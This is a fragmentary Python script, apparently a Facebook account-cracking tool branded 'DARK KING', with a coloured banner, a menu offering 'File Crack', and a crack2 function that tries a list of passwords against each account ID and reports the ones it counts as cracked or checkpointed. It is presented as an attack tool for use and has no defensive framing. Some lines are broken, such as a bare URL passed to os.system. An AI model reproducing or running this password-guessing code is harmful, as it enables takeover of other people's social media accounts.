...
\033[1;32m     \033[1;32mFACEBOK      : \033[1;32m DARK__KING

\033[1;32m     \033[1;32mGITHUB       :  \033[1;32Darkkingcyber71

\033[1;32m     \033[1;32mTOOL STATUS  :  \033[1;32mDARK KING

\033[1;32m     \033[1;32mTEAM         :  \033[1;32mDARK KING

\033[1;32m     \033[1;32mTOOL VIRSION :  \033[1;32m0.5
...
def menu(): #Bilo
	...
	print("""%s \33[1;33m[70] File Crack  """%(h))

	print("""%s \33[1;33m[0] Exit"""%(h))

	print("""%s \x1b[92;1m===================================>\x1b[92;1m """%(h))

	DARK KING = input(x+'\33[1;96m•Input Number>01740281585 ')
	...
	if farhan in ['1','01']:
		...
		os.system("xdg-open https://www.facebook.com/groups/364892702403026/")

		exit()

	else:

		os.system("https://www.facebook.com/md.basit.982845")
...
def crack2(idf,pwv):
	...
	print('\r%s [DARK KING] %s/%s  OK*%s | CP*%s => %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	...
	for pw in pwv:
		...
		try:
			...
			if "www.facebook.com" in resp.json()["error_msg"]:
				...
				print('\r%s [DARK KING] %s|%s        '%(h,idf,pw))
